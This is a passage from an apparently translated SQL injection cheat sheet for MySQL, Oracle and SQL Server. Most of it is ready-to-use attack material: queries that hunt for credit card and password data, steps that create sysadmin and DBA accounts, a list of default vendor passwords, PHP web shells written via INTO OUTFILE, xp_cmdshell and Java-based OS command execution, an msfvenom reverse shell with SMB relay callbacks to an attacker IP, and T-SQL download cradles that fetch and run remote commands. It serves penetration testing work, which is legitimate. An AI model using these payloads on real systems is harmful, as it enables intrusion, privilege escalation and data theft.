style="text-align:center">语句</th></tr></thead><tbody><tr><td>列出非默认数据库</td><td style="text-align:center">SELECT NAME FROM sysdatabases WHERE (NAME NOT LIKE ‘distribution’) AND (NAME NOT LIKE ‘master’) AND (NAME NOT LIKE ‘model’) AND (NAME NOT LIKE ‘msdb’) AND (NAME NOT LIKE ‘publication’) AND (NAME NOT LIKE ‘reportserver’) AND (NAME NOT LIKE ‘reportservertempdb’) AND (NAME NOT LIKE ‘resource’) AND (NAME NOT LIKE ‘tempdb’) ORDER BY NAME;</td></tr><tr><td>列出非默认表</td><td style="text-align:center">SELECT ‘[‘ + SCHEMA_NAME(t.schema_id) + ‘].[‘ + t.name + ‘]’ AS fulltable_name, SCHEMA_NAME(t.schema_id) AS schema_name, t.name AS table_name, i.rows FROM sys.tables AS t INNER JOIN sys.sysindexes AS i ON t.object_id = i.id AND i.indid &lt; 2 WHERE (ROWS&gt; 0) AND (t.name NOT LIKE ‘syscolumns’) AND (t.name NOT LIKE ‘syscomments’) AND (t.name NOT LIKE ‘sysconstraints’) AND (t.name NOT LIKE ‘sysdepends’) AND (t.name NOT LIKE ‘sysfilegroups’) AND (t.name NOT LIKE ‘sysfiles’) AND (t.name NOT LIKE ‘sysforeignkeys’) AND (t.name NOT LIKE ‘sysfulltextcatalogs’) AND (t.name NOT LIKE ‘sysindexes’) AND (t.name NOT LIKE ‘sysindexkeys’) AND (t.name NOT LIKE ‘sysmembers’) AND (t.name NOT LIKE ‘sysobjects’) AND (t.name NOT LIKE ‘syspermissions’) AND (t.name NOT LIKE ‘sysprotects’) AND (t.name NOT LIKE ‘sysreferences’) AND (t.name NOT LIKE ‘systypes’) AND (t.name NOT LIKE ‘sysusers’) ORDER BY TABLE_NAME;</td></tr><tr><td>列名搜索</td><td style="text-align:center">SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME like ‘%password%’</td></tr><tr><td>列出非默认列</td><td style="text-align:center">SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE CHARACTER_MAXIMUM_LENGTH &gt; 14 AND DATA_TYPE NOT IN (‘bigint’,’binary’,’bit’,’cursor’,’date’,’datetime’,’datetime2’, ‘datetimeoffset’,’float’,’geography’,’hierarchyid’,’image’,’int’,’money’,’real’, ‘smalldatetime’,’smallint’,’smallmoney’,’sql_variant’,’table’,’time’,’timestamp’, ‘tinyint’,’uniqueidentifier’,’varbinary’,’xml’) AND TABLE_NAME=’CreditCard’ OR CHARACTER_MAXIMUM_LENGTH &lt; 1 AND DATA_TYPE NOT IN ( ‘bigint’, ‘binary’, ‘bit’, ‘cursor’, ‘date’, ‘datetime’, ‘datetime2’, ‘datetimeoffset’, ‘float’, ‘geography’, ‘hierarchyid’, ‘image’, ‘int’, ‘money’, ‘real’, ‘smalldatetime’, ‘smallint’, ‘smallmoney’, ‘sql_variant’, ‘table’, ‘time’, ‘timestamp’, ‘tinyint’, ‘uniqueidentifier’, ‘varbinary’, ‘xml’) AND TABLE_NAME=’CreditCard’ ORDER BY COLUMN_NAME;</td></tr><tr><td>搜索透明加密</td><td style="text-align:center">SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY a.database_id WHERE is_encrypted=1</td></tr><tr><td>按数据库大小搜索</td><td style="text-align:center">SELECT a.database_id as [dbid], a.name, HAS_DBACCESS(a.name) as [has_dbaccess], SUSER_SNAME(a.owner_sid) as [db_owner], a.is_trustworthy_on, a.is_db_chaining_on, a.is_broker_enabled, a.is_encrypted, a.is_read_only, a.create_date, a.recovery_model_desc, b.filename, (SELECT CAST(SUM(size) * 8. / 1024 AS DECIMAL(8,2)) from sys.master_files where name like a.name) as [DbSizeMb] FROM [sys].[databases] a INNER JOIN [sys].[sysdatabases] b ON a.database_id = b.dbid ORDER BY DbSizeMb DESC</td></tr></tbody></table><h4 id="数据定位正则表达式"><a href="#数据定位正则表达式" class="headerlink" title="数据定位正则表达式"></a>数据定位正则表达式</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>所有主要的信用卡提供商</td><td style="text-align:center">^(?:4[0-9]{12}(?:[0-9]{3})?&#124;(?:5[1-5][0-9]{2}&#124;222[1-9]&#124;22[3-9][0-9]&#124;2[3-6][0-9]{2}&#124;27[01][0-9]&#124;2720)[0-9]{12}&#124;3[47][0-9]{13}&#124;3(?:0[0-5]&#124;[68][0-9])[0-9]{11}&#124;6(?:011&#124;5[0-9]{2})[0-9]{12}&#124;(?:2131&#124;1800&#124;35\d{3})\d{11})$</td></tr><tr><td>Unmasked &#124; Masked SSN</td><td style="text-align:center">^(\d{3}-?\d{2}-?\d{4}&#124;XXX-XX-XXXX)$</td></tr></tbody></table><h4 id="数据定位关键字"><a href="#数据定位关键字" class="headerlink" title="数据定位关键字"></a>数据定位关键字</h4><table><thead><tr><th>关键字</th></tr></thead><tbody><tr><td>credit</td></tr><tr><td>card</td></tr><tr><td>pin</td></tr><tr><td>cvv</td></tr><tr><td>pan</td></tr><tr><td>password</td></tr><tr><td>social</td></tr><tr><td>ssn</td></tr><tr><td>account</td></tr><tr><td>confidential</td></tr></tbody></table><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>　　某些功能需要特权用户，并且为了升级漏洞，特权用户始终是第一步。</p><p><strong>MySQL</strong></p><p>　　暂无</p><p><strong>Oracle</strong></p><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>转储所有DBA用户名</td><td style="text-align:center">SELECT username FROM user_role_privs WHERE granted_role=’DBA’;</td></tr><tr><td>建立DBA用户</td><td style="text-align:center"><code>*</code> GRANT DBA to USER</td></tr><tr><td>创建过程</td><td style="text-align:center"><code>CREATE OR REPLACE PROCEDURE &quot;SYSTEM&quot;.netspi1 (id IN VARCHAR2) AS PRAGMA autonomous_transaction; EXECUTE IMMEDIATE &#39;grant dba to scott&#39;; COMMIT; END; BEGIN SYSTEM.netspi1(&#39;netspi&#39;); END;</code></td></tr><tr><td>查找数据库链接</td><td style="text-align:center">SELECT * FROM DBA_DB_LINKS<br>SELECT * FROM ALL_DB_LINKS<br>SELECT * FROM USER_DB_LINKS</td></tr><tr><td>查询数据库链接</td><td style="text-align:center">SELECT * FROM sales@miami – minimum for preconfigured<br>SELECT * FROM <a href="mailto:harold@netspi.com" target="_blank" rel="noopener">harold@netspi.com</a> – standard usage for selecting table from schema on remote server<br>SELECT * FROM <a href="mailto:harold@netspi.com" target="_blank" rel="noopener">harold@netspi.com</a>@hq_1 – standard usage for selecting table from schema on remote server instance<br>SELECT db_link,password FROM user_db_links WHERE db_link LIKE ‘TEST%’’<br>SELECT name,password FROM sys.link$ WHERE name LIKE ‘TEST%’;<br>SELECT name,passwordx FROM sys.link$ WHERE name LIKE ‘TEST%’;</td></tr><tr><td>在数据库链接上执行存储过程</td><td style="text-align:center">EXEC mySchema.myPackage.myProcedure@myRemoteDB( ‘someParameter’ );<br>SELECT dbms_xmlquery.getxml(‘select * from emp’) FROM <a href="mailto:harold@netspi.com" target="_blank" rel="noopener">harold@netspi.com</a></td></tr><tr><td>创建数据库链接</td><td style="text-align:center">CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com; – connected user setup<br>CREATE SHARED PUBLIC DATABASE LINK supply.us.netspi.com CONNECT TO harold AS tiger; – standard defined user/pass<br>CREATE SHARED PUBLIC DATABASE LINK hq.netspi.com.com@hq_1 USING ‘string_to_hq_1’; – instance specific<br>CREATE SHARED PUBLIC DATABASE LINK link_2 CONNECT TO jane IDENTIFIED BY doe USING ‘us_supply’; – defined user<br>pass</td></tr><tr><td>删除链接</td><td style="text-align:center">DROP DATABASE LINK miami;</td></tr></tbody></table><p><strong>SQL Server</strong></p><p>　　<code>*</code>需要特权用户。以下查询需要各种权限类型。请继续关注详细的权限提升路径。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>建立DBA用户</td><td style="text-align:center">* EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin’;</td></tr><tr><td>授予所有自定义对象的执行权限</td><td style="text-align:center">SELECT ‘grant exec on ‘ + QUOTENAME(ROUTINE_SCHEMA) + ‘.’ +<br>QUOTENAME(ROUTINE_NAME) + ‘ TO test’ FROM INFORMATION_SCHEMA.ROUTINES<br>WHERE OBJECTPROPERTY(OBJECT_ID(ROUTINE_NAME),’IsMSShipped’) = 0 ;</td></tr><tr><td>授予执行所有存储过程</td><td style="text-align:center">CREATE ROLE db_executor<br>GRANT EXECUTE TO db_executor<br>exec sp_addrolemember ‘db_executor’, ‘YourSecurityAccount’</td></tr><tr><td>UNC路径注入</td><td style="text-align:center"><a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e" target="_blank" rel="noopener">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e</a><br><a href="https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/" target="_blank" rel="noopener">https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/</a></td></tr><tr><td>检测非模拟登录</td><td style="text-align:center">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_<br>principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ‘IMPERSONATE’</td></tr><tr><td>模拟登录<br>注意：REVERT会将您带回原始登录名。</td><td style="text-align:center">EXECUTE AS LOGIN = ‘sa’; SELECT @@VERSION;</td></tr><tr><td>创建sysadmin用户</td><td style="text-align:center"><code>*</code> USE [master]<br>GO<br>CREATE LOGIN [test] WITH PASSSWORD=N ‘test’, DEFAULT_DATABASE=[master], CHECK_EXPIRATION=OFF, CHECK_POLICY=OFF<br>GO<br>EXEC master..sp_addsrvrolemember @loginame=N’test’, @rolename=N’sysadmin’<br>GO</td></tr><tr><td>创建sysadmin用户</td><td style="text-align:center"><code>*</code> EXEC sp_addlogin ‘user’, ‘pass’;<br><code>*</code>EXEC master.dbo.sp_addsrvrolemember ‘user’, ‘sysadmin’;</td></tr><tr><td>删除用户</td><td style="text-align:center"><code>*</code> EXEC sp_droplogin ‘user’;</td></tr><tr><td>检索SQL代理连接密码</td><td style="text-align:center">exec msdb.dbo.sp_get_sqlagent_properties</td></tr><tr><td>检索DTS连接密码</td><td style="text-align:center">select msdb.dbo.rtbldmbprops</td></tr><tr><td>获取sysadmin作为本地管理员</td><td style="text-align:center"><a href="https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-sql-server-sysadmin-privileges-local-admin-powerupsql/</a></td></tr><tr><td>启动存储过程</td><td style="text-align:center"><a href="https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/" target="_blank" rel="noopener">https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/</a></td></tr><tr><td>触发器创建</td><td style="text-align:center"><a href="https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/" target="_blank" rel="noopener">https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/</a></td></tr><tr><td>Windows自动登录密码</td><td style="text-align:center"><a href="https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/</a></td></tr><tr><td>xp_regwrite非sysadmin执行</td><td style="text-align:center"><a href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e" target="_blank" rel="noopener">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td></tr><tr><td>具有可信赖数据库的存储过程</td><td style="text-align:center"><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases</a></td></tr><tr><td>存储过程用户模拟</td><td style="text-align:center"><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/</a></td></tr><tr><td>默认密码</td><td style="text-align:center">sa:sa<br>sa:[empty]<br>[username]:[username]</td></tr><tr><td>实例的默认密码（实例名称，用户，密码）</td><td style="text-align:center">“ACS”,”ej”,”ej”<br>“ACT7”,”sa”,”sage”<br>“AOM2”,”admin”,”ca_admin”<br>“ARIS”,”ARIS9”,”*ARIS!1dm9n#”<br>“AutodeskVault”,”sa”,”AutodeskVault@26200” “BOSCHSQL”,”sa”,”RPSsql12345”<br>“BPASERVER9”,”sa”,”AutoMateBPA9”<br>“CDRDICOM”,”sa”,”CDRDicom50!”<br>“CODEPAL”,”sa”,”Cod3p@l”<br>“CODEPAL08”,”sa”,”Cod3p@l”<br>“CounterPoint”,”sa”,”CounterPoint8”<br>“CSSQL05”,”ELNAdmin”,”ELNAdmin”<br>“CSSQL05”,”sa”,”CambridgeSoft_SA”<br>“CADSQL”,”CADSQLAdminUser”,”Cr41g1sth3M4n!”<br>“DHLEASYSHIP”,”sa”,”DHLadmin@1”<br>“DPM”,”admin”,”ca_admin”<br>“DVTEL”,”sa”,””<br>“EASYSHIP”,”sa”,”DHLadmin@1”<br>“ECC”,”sa”,”Webgility2011”<br>“ECOPYDB”,”e+C0py2007_@x”,”e+C0py2007_@x”<br>“ECOPYDB”,”sa”,”ecopy”<br>“Emerson2012”,”sa”,”42Emerson42Eme”<br>“HDPS”,”sa”,”sa”<br>“HPDSS”,”sa”,”Hpdsdb000001”<br>“HPDSS”,”sa”,”hpdss”<br>“INSERTGT”,”msi”,”keyboa5”<br>“INSERTGT”,”sa”,””<br>“INTRAVET”,”sa”,”Webster#1”<br>“MYMOVIES”,”sa”,”t9AranuHA7”<br>“PCAMERICA”,”sa”,”pcAmer1ca”<br>“PCAMERICA”,”sa”,”PCAmerica”<br>“PRISM”,”sa”,”SecurityMaster08”<br>“RMSQLDATA”,”Super”,”Orange”<br>“RTCLOCAL”,”sa”,”mypassword”<br>“SALESLOGIX”,”sa”,”SLXMaster”<br>“SIDEXIS_SQL”,”sa”,”2BeChanged”<br>“SQL2K5”,”ovsd”,”ovsd”<br>“SQLEXPRESS”,”admin”,”ca_admin”<br>“STANDARDDEV2014”,”test”,”test” “TEW_SQLEXPRESS”,”tew”,”tew”<br>“vocollect”,”vocollect”,”vocollect”<br>“VSDOTNET”,”sa”,””<br>“VSQL”,”sa”,”111”</td></tr></tbody></table><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>　　执行系统命令是SQL注入的主要目标之一，这有助于完全控制主机操作系统。这可能通过直接执行命令，修改现有数据以在网页上放置shell或者利用数据库中的隐藏功能来实现。</p><h4 id="MySQL-3"><a href="#MySQL-3" class="headerlink" title="MySQL"></a>MySQL</h4><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>命令执行（PHP）</td><td style="text-align:center">SELECT “&lt;? echo passthru($_GET[‘cmd’]); ?&gt;” INTO OUTFILE ‘/var/www/shell.php’</td></tr><tr><td>使用MySQL CLI Access执行命令</td><td style="text-align:center"><a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank" rel="noopener">https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/</a></td></tr></tbody></table><p>SMB中继外壳</p><p>Requires</p><ul><li><a href="https://www.metasploit.com/" target="_blank" rel="noopener">Metasploit</a></li><li><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">smbrelayx</a></li></ul><h5 id="生成反向shell有效负载"><a href="#生成反向shell有效负载" class="headerlink" title="生成反向shell有效负载"></a>生成反向shell有效负载</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR.IP.GOES.HERE LPORT=443  -f exe &gt; reverse_shell.exe</span><br></pre></td></tr></table></figure><h5 id="生成一个侦听器来传递反向shell"><a href="#生成一个侦听器来传递反向shell" class="headerlink" title="生成一个侦听器来传递反向shell"></a>生成一个侦听器来传递反向shell</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbrelayx.py -h VICTIM.IP.GOES.HERE -e ./reverse_shell.exe</span><br></pre></td></tr></table></figure><h5 id="执行下面的任何一个MySQL查询来调用监听器"><a href="#执行下面的任何一个MySQL查询来调用监听器" class="headerlink" title="执行下面的任何一个MySQL查询来调用监听器"></a>执行下面的任何一个MySQL查询来调用监听器</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">'\\\\YOUR.IP.GOES.HERE\\aa'</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="number">0x5c5c5c5c3139322e3136382e302e3130315c5c6161</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="string">'netspi'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'\\\\YOUR.IP.GOES.HERE\\aa'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">'netspi'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'\\\\YOUR.IP.GOES.HERE\\aa'</span>;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">'\\\\YOUR.IP.GOES.HERE\\aa'</span> <span class="keyword">into</span> <span class="keyword">table</span> database.table_name;</span><br></pre></td></tr></table></figure><p>　　有关更多信息，请参见<a href="https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/" target="_blank" rel="noopener">此处</a></p><h4 id="Oracle-4"><a href="#Oracle-4" class="headerlink" title="Oracle"></a>Oracle</h4><p>　　如果安装了<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank" rel="noopener">Java</a>，可用于执行命令</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>创建Java类</td><td style="text-align:center">/* create Java class */<br> <code>BEGIN EXECUTE IMMEDIATE &#39;create or replace and compile java source named &quot;PwnUtil&quot; as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = &quot;&quot;;while ((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = &quot;&quot;;while((stemp = myReader.readLine()) != null) str += stemp + &quot;\n&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}}};&#39;; END;</code><br>/<br> <code>BEGIN EXECUTE IMMEDIATE &#39;create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name &#39;&#39;PwnUtil.runCmd(java.lang.String) return String&#39;&#39;;&#39;; END;</code><br>/<br>/* run OS command */<br> <code>SELECT PwnUtilFunc(&#39;ping -c 4 localhost&#39;) FROM dual;</code></td></tr><tr><td>创建Java类（十六进制编码）</td><td style="text-align:center">/* create Java class */<br>SELECT TO_CHAR(dbms_xmlquery.getxml(‘declare PRAGMA AUTONOMOUS_TRANSACTION;<br>begin execute immediate utl_raw.cast_to_varchar2(hextoraw(‘’<br>637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75<br>726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e<br>2a3b7075626c696320636c6173732070776e7574696c7b7075626c6963207374617469632053<br>7472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561<br>646572206d726561643d6e6577204275666665726564526561646572286e657720496e707574<br>53747265616d5265616465722852756e74696d652e67657452756e74696d6528292e65786563<br>2861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d<br>702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e65<br>28292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f<br>736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72<br>657475726e20652e746f537472696e6728293b7d7d7d’’));<br>SEXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(‘’<br>637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e63<br>28705f636d6420696e207661726368617232292072657475726e207661726368617232206173<br>206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e<br>6c616e672e537472696e67292072657475726e20537472696e67273b’’)); end;’)) results FROM dual<br>/* run OS command */<br>SELECT PwnUtilFunc(‘ping -c 4 localhost’) FROM dual;</td></tr></tbody></table><h4 id="SQL-Server-4"><a href="#SQL-Server-4" class="headerlink" title="SQL Server"></a>SQL Server</h4><table><thead><tr><th>名称</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>xp_cmdshell</td><td style="text-align:center">-- Enable show advanced options<br>sp_configure ‘show advanced options’, 1<br>RECONFIGURE<br>GO<br>-- Enable xp_cmdshell<br>sp_configure ‘xp_cmdshell’, 1<br>RECONFIGURE<br>GO<br>EXEC xp_cmdshell ‘net user’</td></tr><tr><td>写入注册表自动运行</td><td style="text-align:center"><a href="https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/" target="_blank" rel="noopener">https://blog.netspi.com/establishing-registry-persistence-via-sql-server-powerupsql/</a><br> <a href="https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e" target="_blank" rel="noopener">https://gist.github.com/nullbind/03af8d671621a6e1cef770bace19a49e</a></td></tr><tr><td>写入文件自动运行</td><td style="text-align:center"><a href="https://blog.netspi.com/how-to-hack-database-links-in-sql-server/" target="_blank" rel="noopener">https://blog.netspi.com/how-to-hack-database-links-in-sql-server/</a></td></tr><tr><td>Agent Job</td><td style="text-align:center"><a href="https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution" target="_blank" rel="noopener">https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution</a></td></tr><tr><td>存储过程中的SQL注入</td><td style="text-align:center"><a href="https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/" target="_blank" rel="noopener">https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/</a></td></tr><tr><td>CLR组件</td><td style="text-align:center"><a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/" target="_blank" rel="noopener">https://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></td></tr><tr><td>自定义扩展存储过程</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/cmd_exec.cpp</a></td></tr></tbody></table><h5 id="TSQL"><a href="#TSQL" class="headerlink" title="TSQL"></a>TSQL</h5><table><thead><tr><th>名称</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>ActiveX Javascript Agent Job</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_jscript.sql</a></td></tr><tr><td>ActiveX VBScript Agent Job</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_activex_vbscript.sql</a></td></tr><tr><td>cmdexec Agent Job</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_cmdexec.sql</a></td></tr><tr><td>Powershell Agent Job</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_agentjob_powershell.sql</a></td></tr><tr><td>自定义命令行shell</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_customxp.cpp</a></td></tr><tr><td>OLE自动化对象</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_oleautomationobject.sql</a></td></tr><tr><td>OPENROWSET</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_openrowset.sql</a></td></tr><tr><td>Python</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_pythonscript.tsql</a></td></tr><tr><td>R</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_rscript.sql</a></td></tr><tr><td>xp_cmdshell proxy</td><td style="text-align:center"><a href="https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/oscmdexec_xpcmdshell_proxy.sql</a></td></tr></tbody></table><h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>　　读取和写入文件有助于数据收集和数据泄露。许多方法包括写入webroot，这可以执行webshell，或允许数据通过端口80/443被泄露。</p><h4 id="MySQL-4"><a href="#MySQL-4" class="headerlink" title="MySQL"></a>MySQL</h4><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>转储到文件</td><td style="text-align:center">SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’</td></tr><tr><td>写入 PHP Shell 到文件</td><td style="text-align:center">SELECT ‘system($_GET[\’c\’]); ?&gt;’ INTO OUTFILE ‘/var/www/shell.php’</td></tr><tr><td>读文件</td><td style="text-align:center">SELECT LOAD_FILE(‘/etc/passwd’)</td></tr><tr><td>读取混淆的文件</td><td style="text-align:center">SELECT LOAD_FILE(0x633A5C626F6F742E696E69)<br>reads c:\boot.ini</td></tr><tr><td>文件权限</td><td style="text-align:center">SELECT file_priv FROM mysql.user WHERE user = ‘netspi’<br>SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%netspi%’</td></tr></tbody></table><h4 id="Oracle-5"><a href="#Oracle-5" class="headerlink" title="Oracle"></a>Oracle</h4><p>　　有时可以使用<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank" rel="noopener">UTL_FILE</a>。检查以下是否为非null</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">value</span> <span class="keyword">FROM</span> v$parameter2 <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'utl_file_dir'</span>;</span><br></pre></td></tr></table></figure><p>　　如果安装了<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank" rel="noopener">Java</a>（Oracle Express中不可用），可用于读取和写入文件。</p><h4 id="SQL-Server-5"><a href="#SQL-Server-5" class="headerlink" title="SQL Server"></a>SQL Server</h4><p>　　<code>*</code>需要特权用户</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>在服务器中下载Cradle bulk - TSQL</td><td style="text-align:center">-- Bulk Insert - Download Cradle Example<br>-- Setup variables Declare @cmd varchar(8000)<br>-- Create temp table<br>CREATE TABLE #file (content nvarchar(4000));<br>-- Read file into temp table - web server must support propfind<br><br>BULK INSERT #file FROM ‘\sharepoint.acme.com@SSL\Path\to\file.txt’;<br>-- Select contents of file<br><br>SELECT @cmd = content FROM #file<br>-- Display command<br><br>SELECT @cmd<br>-- Run command<br><br>EXECUTE(@cmd)<br>-- Drop the temp table<br><br>DROP TABLE #file</td></tr><tr><td>下载Cradle OAP 1 - SQL</td><td style="text-align:center"><br>-- OLE Automation Procedure - Download Cradle Example<br>-- Does not require a table, but can’t handle larger payloads<br><br>-- Note: This also works with unc paths \\ip\file.txt<br>-- Note: This also works with webdav paths \ip@80\file.txt However, the target web server needs to support propfind.<br><br>-- Setup Variables<br>DECLARE @url varchar(300)<br>DECLARE @WinHTTP int<br>DECLARE @handle 